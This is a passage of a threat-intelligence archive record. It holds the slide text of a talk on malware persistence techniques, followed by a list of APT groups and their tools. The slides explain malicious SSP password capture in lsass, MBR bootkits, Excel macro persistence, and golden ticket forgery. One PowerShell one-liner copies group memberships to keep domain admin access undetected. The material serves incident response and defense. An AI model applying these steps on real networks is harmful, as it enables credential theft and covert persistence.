into](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-70-638.jpg?cb=1460820675)\n\nlsass.exe. ○ No need for injection ● Can develop your own SSP DLL ○ Required export:\nSpLsaModeInitialize Original research performed by Matt Graeber released at MIRcon\n2014\n[71. 71. Security Support Provider ● Use Persistence.psm1 PowerSploit module to install](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-71-638.jpg?cb=1460820675)\n\nyour malcious SSP ● Benjamin Delpy (@gentilkiwi) added SSP functionality to\nmimilib.dll. ○ Once installed and loaded into lsass.exe, it captures plaintext passwords.\n\n  - This is acheived with the SpAcceptCredential callback function. Original research\nperformed by Matt Graeber released at MIRcon 2014\n[72. 72. Malicious SSP Poc - mimilib Image taken from “Analysis of Malicious SSP” -](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-72-638.jpg?cb=1460820675)\n\nMIRcon 2014\n[73. 73. Security Support Provider %windir%System32kiwissp.log Image taken from](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-73-638.jpg?cb=1460820675)\n\n“Analysis of Malicious SSP” - MIRcon 2014\n[74. 74. Bootkit ● A “bootkit” is a program that can alter the Master Boot Record (MBR) or](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-74-638.jpg?cb=1460820675)\n\nVirtual Boot Record (VBR) so that malicious code is executed before the operating\nsystem is loaded. ● Moves the original MBR to a different location and places itself at\nthe beginning of the drive.\n[75. 75. Bootkit ○ Upon boot, a bootkit will modify a service to point to a modfied DLL on](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-75-638.jpg?cb=1460820675)\n\ndisk. ○ Service DLL is responsible for executing backdoor payload.\n\n\n-----\n\n[76. 76. Bootkit ○ After payload execution, the modified service is changed to point to](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-76-638.jpg?cb=1460820675)\n\noriginal DLL. ○ Cycle repeats after each reboot.\n[77. 77. But How Does It Work? ● Malcious MBR: Windows BIOS loads the modified MBR,](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-77-638.jpg?cb=1460820675)\n\nwhich then loads the code in stage 2. ● Initial Loader: Loads the stage 3 code that was\npreviously stored as a file on disk and in unallocated space.\n[78. 78. But How Does It Work? ● Secondary Loader: Loads code that enables the](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-78-638.jpg?cb=1460820675)\n\ninstallation and configuration of backdoor. The service hijacking phase. ● Backdoor\nLoader: Loads the backdoor from disk. Also the replaces hijacked service back to\noriginal form.\n[79. 79. But How Does It Work? Simplied MBR bootkit execution taken from Mtrends 2016](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-79-638.jpg?cb=1460820675)\n[80. 80. Excel Magic ● Malicious macro executes backdoor ● Ways you an ensure](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-80-638.jpg?cb=1460820675)\n\npersistence? ○ Most people will execute Excel at least once a day ○ So why not\nleverage this as a persistence technique?\n[81. 81. Excel Magic ○ You can use “old way” persistence techniques to execute Excel at](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-81-638.jpg?cb=1460820675)\n\nstartup - that is a legit program! ○ Disable macro security settings so workbook\nexecutes without prompt\n[82. 82. Excel Magic ● Registry modification that executes specific Excel workbook upon](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-82-638.jpg?cb=1460820675)\n\nExcel start ○ HKEY_CURRENT_USERSoftware MicrosoftOffice12.0ExcelSecurity\nTrusted Locations ○ Add location\n[83. 83. Additional Persistence Options?](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-83-638.jpg?cb=1460820675)\n[84. 84. Golden Ticket ● This method came out due to Benjamin Delpy working with Sean](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-84-638.jpg?cb=1460820675)\n\nMetcalf. ● This forges a golden ticket which can be good for 10 years! ● Golden tickets\ncan provide on-demand domain privilege “upgrades” for any group within a domain.\n[85. 85. Golden Ticket ● You only need four pieces of information: ○ Domain SID ○ The](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-85-638.jpg?cb=1460820675)\n\nname of the domain ○ User you want to create the hash for ○ krbtgt account hash ● You\ncan build it offline, right at home\n[86. 86. Golden Ticket](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-86-638.jpg?cb=1460820675)\n[87. 87. Golden Ticket](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-87-638.jpg?cb=1460820675)\n[88. 88. Golden Ticket](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-88-638.jpg?cb=1460820675)\n[89. 89. Golden Ticket ● Key takeaways: ○ If impersonating a real user, even if pass is](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-89-638.jpg?cb=1460820675)\n\nchanged, this still works ○ Valid for as long as you specify (10 year default) ○ Only way\nto stop is change krbtgt hash… twice.. Or rebuild from bare metal :)\n[90. 90. Account Checkout? ● Case Study: ○ Client has account checkout system for](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-90-638.jpg?cb=1460820675)\n\ndomain administrator (DA) accounts. ○ Only two users have access to that system ○\nSystem requires 2FA. ○ You can lose DA access if the user changes his password, pin,\nor token. ○ User can see what accounts he checked out (could get caught!)\n[91. 91. Account Checkout? ● We need to persist domain administrator without getting](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-91-638.jpg?cb=1460820675)\n\ncaught. ○ If we keep checking out accounts with the user we have, he might see that\nhe has accounts checked out that he didn’t check out.\n[92. 92. Account Checkout?](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-92-638.jpg?cb=1460820675)\n\n\n-----\n\n[93. 93. Account Checkout? ● Password Vault permissions were managed through Active](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-93-638.jpg?cb=1460820675)\n\nDirectory Groups...TONS of them. ○ Copy group memberships to a compromised user\nwho doesn’t use PasswordVault ■ Note: All changes were well documented to revert\n[94. 94. Account Checkout? Get-ADUser –Identity <SOURCE USERNAME> -Properties](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-94-638.jpg?cb=1460820675)\n\nmemberof | Select- Object –ExpandProperty memberof | Add- ADGroupMember –\nMembers <DESTINATION USERNAME>\n[95. 95. Conclusion ● Malware persistence will remain rampant. There will always be new](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-95-638.jpg?cb=1460820675)\n\nand creative ways for maintaining persistence. ● Understanding malware persistence\ntechniques is critical as it serves as a focal point for incident response investigations\nand help drive successful remediation.\n[96. 96. ? ● Chris Truncer ○ @ChrisTruncer ○ CTruncer@christophertruncer.com ● Evan](https://image.slidesharecdn.com/everpresentpersistence-establishedfootholdsseeninthewild-160416152454/95/ever-present-persistence-established-footholds-seen-in-the-wild-96-638.jpg?cb=1460820675)\n\nPena ○ @evan_pena2003 ○ evan@evanpena.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-04-16 - Ever Present Persistence - Established Footholds Seen in the Wild.pdf"
    ],
    "report_names": [
        "2016-04-16 - Ever Present Persistence - Established Footholds Seen in the Wild.pdf"
    ],
    "threat_actors": [
        {
            "id": "1f3cf3d1-4764-4158-a216-dd6352e671bb",
            "created_at": "2022-10-25T15:50:23.837615Z",
            "updated_at": "2025-03-27T02:00:55.556414Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "APT19",
                "Codoso",
                "C0d0so0",
                "Codoso Team",
                "Sunshop Group"
            ],
            "source_name": "MITRE:APT19",
            "tools": [
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2150d1ac-edf0-46d4-a78a-a8899e45b2b5",
            "created_at": "2022-10-25T15:50:23.269339Z",
            "updated_at": "2025-03-27T02:00:55.416524Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "APT17",
                "Deputy Dog"
            ],
            "source_name": "MITRE:APT17",
            "tools": [
                "BLACKCOFFEE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dd583696-3de6-4c23-bfb6-e675a38a7000",
            "created_at": "2022-10-25T16:07:23.338398Z",
            "updated_at": "2025-03-27T02:02:09.744409Z",
            "deleted_at": null,
            "main_name": "APT 20",
            "aliases": [
                "APT 20",
                "APT 8",
                "Crawling Taurus",
                "Operation Wocao",
                "TH3Bug",
                "Violin Panda"
            ],
            "source_name": "ETDA:APT 20",
            "tools": [
                "Agent.dhwf",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Filesnfer",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "KeeThief",
                "Kerberoast",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PlugX",
                "Poison Ivy",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SMBExec",
                "SPIVY",
                "SharpHound",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "WinRAR",
                "XServer",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7b039cc0-33b6-495a-b4ca-649d096b993d",
            "created_at": "2023-01-06T13:46:38.482654Z",
            "updated_at": "2025-03-27T02:00:02.845093Z",
            "deleted_at": null,
            "main_name": "APT22",
            "aliases": [
                "BRONZE OLIVE",
                "Group 46",
                "G0039",
                "Suckfly"
            ],
            "source_name": "MISPGALAXY:APT22",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf02412a-041a-4c8d-8ffa-3bff7dd812b5",
            "created_at": "2024-02-02T02:00:04.018717Z",
            "updated_at": "2025-03-27T02:00:03.289534Z",
            "deleted_at": null,
            "main_name": "Blue Tsunami",
            "aliases": [
                "Black Cube"
            ],
            "source_name": "MISPGALAXY:Blue Tsunami",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d0f389f-2f6c-415d-91f4-633bd6c645f7",
            "created_at": "2024-05-01T02:03:07.974188Z",
            "updated_at": "2025-03-27T02:05:17.280317Z",
            "deleted_at": null,
            "main_name": "BRONZE OLIVE",
            "aliases": [
                "Barista",
                "Group 46 ",
                "Suckfly ",
                "APT22 "
            ],
            "source_name": "Secureworks:BRONZE OLIVE",
            "tools": [
                " DestroyRAT",
                " PlugX",
                " TCP/ICMP RAT",
                "Angryrebel"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1edcac0b-efd9-47b1-9aca-33827d5bd085",
            "created_at": "2024-05-01T02:03:07.964773Z",
            "updated_at": "2025-03-27T02:05:17.273595Z",
            "deleted_at": null,
            "main_name": "BRONZE KEYSTONE",
            "aliases": [
                "Aurora Panda ",
                "DeputyDog ",
                "Group 72 ",
                "Hidden Lynx ",
                "Shell Crew",
                "TG-8153 ",
                "Tailgater Team",
                "APT17 "
            ],
            "source_name": "Secureworks:BRONZE KEYSTONE",
            "tools": [
                " BlackCoffee",
                " DeputyDog",
                " Derusbi",
                " Gh0stHTTPSDropper",
                " HiKit",
                " InternalCMD",
                " PlugX",
                " PoisonIvy",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "0639667a-fb3f-43d9-a38c-6c123fd19c7f",
            "created_at": "2022-10-25T16:07:23.335869Z",
            "updated_at": "2025-03-27T02:02:09.743237Z",
            "deleted_at": null,
            "main_name": "APT 19",
            "aliases": [
                "APT 19",
                "Bronze Firestone",
                "C0d0so0",
                "Codoso",
                "Deep Panda",
                "Operation Kingslayer",
                "Red Pegasus",
                "Sunshop Group",
                "TG-3551"
            ],
            "source_name": "ETDA:APT 19",
            "tools": [
                "Agentemis",
                "C0d0so0",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "EmPyre",
                "EmpireProject",
                "Fire Chili",
                "PowerShell Empire",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "86fd71d3-06dc-4b73-b038-cedea7b83bac",
            "created_at": "2022-10-25T16:07:23.330793Z",
            "updated_at": "2025-03-27T02:02:09.740703Z",
            "deleted_at": null,
            "main_name": "APT 17",
            "aliases": [
                "APT 17",
                "ATK 2",
                "Beijing Group",
                "Bronze Keystone",
                "Deputy Dog",
                "Elderwood",
                "Elderwood Gang",
                "Operation Aurora",
                "Operation DeputyDog",
                "Operation Ephemeral Hydra",
                "Operation RAT Cook",
                "SIG22",
                "Sneaky Panda",
                "TEMP.Avengers",
                "TG-8153",
                "Tailgater Team"
            ],
            "source_name": "ETDA:APT 17",
            "tools": [
                "9002 RAT",
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "Agent.dhwf",
                "AngryRebel",
                "BlackCoffee",
                "Briba",
                "Chymine",
                "Comfoo",
                "Comfoo RAT",
                "Darkmoon",
                "DeputyDog",
                "Destroy RAT",
                "DestroyRAT",
                "Farfli",
                "Fexel",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Gresim",
                "HOMEUNIX",
                "HiKit",
                "HidraQ",
                "Homux",
                "Hydraq",
                "Jumpall",
                "Kaba",
                "Korplug",
                "Linfo",
                "MCRAT.A",
                "McRAT",
                "MdmBot",
                "Mdmbot.E",
                "Moudour",
                "Mydoor",
                "Naid",
                "Nerex",
                "PCRat",
                "PNGRAT",
                "Pasam",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trojan.Naid",
                "Vasport",
                "Wiarp",
                "Xamtrav",
                "Zox",
                "ZoxPNG",
                "ZoxRPC",
                "gresim",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "273a41a8-5115-4f55-865f-0960a765f18c",
            "created_at": "2022-10-25T16:07:24.397947Z",
            "updated_at": "2025-03-27T02:02:10.208221Z",
            "deleted_at": null,
            "main_name": "Wicked Spider",
            "aliases": [
                "APT 22",
                "Bronze Export",
                "Bronze Olive",
                "Wicked Spider"
            ],
            "source_name": "ETDA:Wicked Spider",
            "tools": [
                "Agent.dhwf",
                "AngryRebel",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EternalBlue",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "Kaba",
                "Korplug",
                "Moudour",
                "Mydoor",
                "PCRat",
                "PlugX",
                "RedDelta",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Xamtrav"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536194,
    "ts_updated_at": 1743041818,
    "ts_creation_date": 1653785649,
    "ts_modification_date": 1653785649,
    "files": {
        "pdf": "https://archive.orkl.eu/a4a3240beb2f89c79497766f4ba9049dd25f86cf.pdf",
        "text": "https://archive.orkl.eu/a4a3240beb2f89c79497766f4ba9049dd25f86cf.txt",
        "img": "https://archive.orkl.eu/a4a3240beb2f89c79497766f4ba9049dd25f86cf.jpg"
    }
}